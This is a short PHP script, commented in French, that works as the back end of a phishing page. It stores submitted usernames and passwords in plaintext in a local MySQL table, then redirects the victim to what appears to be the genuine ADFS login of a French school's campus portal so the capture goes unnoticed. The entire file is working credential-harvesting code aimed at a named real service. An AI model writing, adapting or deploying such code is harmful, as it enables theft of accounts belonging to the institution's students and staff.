<?php
// Connexion à la base de données
$host = "localhost"; // Serveur MySQL (phpMyAdmin)
$user = "root"; // Nom d'utilisateur par défaut (à modifier si nécessaire)
$password = ""; // Mot de passe (laisser vide si vous utilisez XAMPP)
$database = "login_db"; // Nom de la base de données

$conn = new mysqli($host, $user, $password, $database);

// Vérifier la connexion
if ($conn->connect_error) {
    die("Échec de la connexion à la base de données : " . $conn->connect_error);
}

// Récupérer les données du formulaire
$username = isset($_POST['UserName']) ? $_POST['UserName'] : '';
$password = isset($_POST['Password']) ? $_POST['Password'] : '';

// Vérifier si les champs ne sont pas vides
if (!empty($username) && !empty($password)) {
    // Préparer et exécuter la requête SQL
    $stmt = $conn->prepare("INSERT INTO users_logins (username, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $username, $password);
    $stmt->execute();
    $stmt->close();
}

// Fermer la connexion à la base de données
$conn->close();

// Rediriger vers la page de connexion
header("Location: https://adfs.inseecgateway.com/adfs/ls/?wa=wsignin1.0&wtrealm=urn%3aece.campusonline.me%3ainseec&wctx=https%3a%2f%2fece.campusonline.me%2f_layouts%2f15%2fAuthenticate.aspx%3fSource%3d%25252F");
exit();
?>
